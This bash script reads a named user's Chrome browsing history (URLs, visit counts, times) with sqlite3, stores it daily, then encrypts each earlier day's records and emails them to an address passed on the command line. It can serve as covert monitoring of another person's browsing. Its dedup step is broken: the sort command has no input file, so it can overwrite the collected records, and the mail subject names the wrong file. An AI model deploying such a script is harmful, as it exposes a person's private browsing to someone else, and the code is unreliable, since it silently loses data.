#!/bin/bash

# Sync chrome usages. Needs sqlite3 in path

if [ "$#" -ne 4 ] ; then
    echo "Usage: $0 UserName EncryptionKey FromEmailAddress ToEmailAddress"
    exit 1
fi

# user is used to construct path to chrome History file and workDir
user="$1"
ecKey="$2"
fromAddr="$3"
toAddr="$4"

LOCKFILE="/tmp/chrome_sync_lock.txt"
if [ -e ${LOCKFILE} ]; then
    echo "already running"
    exit
fi
# make sure the lockfile is removed when we exit and then claim it
trap "rm -f ${LOCKFILE}; exit" INT TERM EXIT
touch ${LOCKFILE}


# Business logic starts...
workDir="/etc/${user}/chrome_history"
cd ${workDir} || { echo "Could not cd into ${workDir}. Exiting"; exit; }
source "./venv/bin/activate" || { echo "Could not activate python venv.";  exit; }
ENCRYPT_UTIL="./encrypt_decrypt.py"
MAILER_UTIL="./mailer.py"
query="SELECT urls.url, urls.visit_count, urls.last_visit_time FROM urls;"
historyFileName="History"
historyFilePath="/home/${user}/.config/google-chrome/Default/${historyFileName}"
cp ${historyFilePath} ./${historyFileName}
day=$(date +%d)
recordsFilePrefix="records_"
recordFile="${recordsFilePrefix}${day}"
if [ ! -f "$recordFile" ]; then
    # Check if previous day's record exist. If yes, then share those.
    for fileName in `ls -d ${recordsFilePrefix}*`; do
        filePath="${PWD}/${fileName}"
        echo "Processing file $filePath"
        # Send and then delete
        # First: encrypt, and then send
        if [ ! -s "$filePath" ]; then
          echo "Empty file ${filePath}. Deleting and skipping send"
          rm -f "$filePath"
          continue
        fi
        python ${ENCRYPT_UTIL} "${ecKey}" "encrypt" "$filePath"
        encryptedFilePath="${filePath}.ec"
        if [ ! -f "$encryptedFilePath" ]; then
            echo "Unknown error. Skipping sync of ${filePath}"
            continue
        else
            # Send the encrypted file and then delete it.
            echo "Sending file ${encryptedFilePath} ..."
            python ${MAILER_UTIL} "${fromAddr}" "${toAddr}" "GChrme Records ${recordFile}" "${encryptedFilePath}"
            rm -f "$encryptedFilePath" || { echo "Failed to delete ${encryptedFilePath}, exiting."; exit; }
        fi
        rm -f "$filePath"
    done

    touch "${recordFile}" || { echo "Failed to create records file ${recordFile}"; exit; }
fi
sqlite3 "./${historyFileName}" "${query}" >> "${recordFile}"
# Deduplicate records by url.
sort -u -t '|' -k1,1 -o "${recordFile}"
rm -f "./${historyFileName}"
# Business logic ends here


rm -f ${LOCKFILE}
